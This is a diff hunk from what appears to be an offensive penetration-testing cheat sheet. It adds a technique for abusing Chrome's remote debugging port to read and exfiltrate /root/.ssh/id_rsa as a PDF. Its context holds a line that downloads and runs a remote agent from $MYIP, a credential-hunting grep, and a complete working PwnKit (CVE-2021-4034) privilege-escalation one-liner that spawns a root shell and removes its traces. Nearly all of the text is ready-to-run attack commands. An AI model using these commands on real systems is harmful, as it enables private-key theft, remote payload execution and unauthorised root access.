@@ -1499,6 +1499,13 @@ curl $MYIP:53/linux/agent -o /dev/shm/agent;chmod +x /dev/shm/agent;/dev/shm/age
 +---------- Creds In DB Files ----------+
 grep -IrinE "db[-_]?(user|pass|login)\w*" / 2>/dev/null
 
++---------- Chrome Debugging ----------+
+curl -sg http://240.0.0.1:41829/json
+echo 'Target.createTarget {"url":"file:///root/.ssh/id_rsa"}' | websocat -n1 --jsonrpc --jsonrpc-omit-jsonrpc 'ws://240.0.0.1:41829/devtools/page/0DC707C3C63E0C0E7B012B8AE0597CC0'
+curl -sg http://240.0.0.1:41829/json
+echo 'Page.printToPDF {}\n' | websocat -n1 --jsonrpc --jsonrpc-omit-jsonrpc 'ws://240.0.0.1:41829/devtools/page/BEAA157A683895274AA8D0BD21B80D0E' | jq -r '.result.data' | base64 -d > output.pdf
+sudo update-binfmts --disable cli; open output.pdf
+
 +---------- Polkit (CVE-2021-4034) ----------+
 echo $'F=-Wall\n\nT=$(shell which true)\n\n.PHONY: all\nall: m.so run gconv-modules gconvpath\n\n.PHONY: clean\nclean:\n\trm -rf m.so run gconv-modules GCONV_PATH=./\n\ngconv-modules:\n\techo "module UTF-8// PWN// m 1" > $@\n\n.PHONY: gconvpath\ngconvpath:\n\tmkdir -p GCONV_PATH=.\n\tcp $(T) GCONV_PATH=./m.so:.\n\nm.so: m.c\n\t$(CC) $(F) --shared -fPIC -o $@ $<\n' >Makefile; echo $'#include <unistd.h>\nint main(){char * const e[]={"m.so:.","PATH=GCONV_PATH=.","SHELL=/x","CHARSET=PWN",NULL};return execve("/usr/bin/pkexec",NULL,e);}' >run.c; echo $'#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid gconv(){}\nvoid gconv_init(void *p){char * const a[]={"/bin/sh",NULL};char * const e[]={"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",NULL};setuid(0);setgid(0);execve(a[0],a,e);exit(0);}' >m.c; make; ./run; rm gconv-modules Makefile m.c m.so run run.c; rm -rf GCONV_PATH=.
 
